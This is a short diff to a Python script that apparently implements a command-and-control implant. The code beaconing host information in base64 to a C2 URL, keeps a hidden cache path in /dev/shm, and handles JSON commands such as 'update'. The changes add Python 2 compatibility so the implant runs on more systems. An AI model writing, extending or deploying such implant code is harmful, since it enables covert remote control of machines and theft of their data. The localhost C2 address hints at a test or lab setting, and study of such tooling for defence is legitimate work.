@@ -2,14 +2,20 @@
 import json
 import os
 import random
+import sys
+
 import re
 import socket
 import subprocess
 from base64 import b64encode, b64decode
-from json import JSONDecodeError
 from multiprocessing import Process
 from time import sleep
-from urllib import request
+
+if sys.version_info[0] < 3:
+    import urllib2 as request
+else:
+    from urllib import request
+
 
 c2 = 'http://localhost:5000/'
 path = '/dev/shm/.cache'
@@ -33,7 +39,7 @@ def parse_msg(html):
             return re.search('value="(.*)"', line).group(1)
 
 
-def register() -> str:
+def register():
     while True:
         try:
             r = request.urlopen(request.Request(c2 + loc, data=b64encode(info.encode()),
@@ -69,7 +75,7 @@ def handle_msg(msg):
     if msg:
         try:
             msg = json.loads(msg)
-        except JSONDecodeError:
+        except:
             pass
         else:
             if msg['cmd'] == 'update':
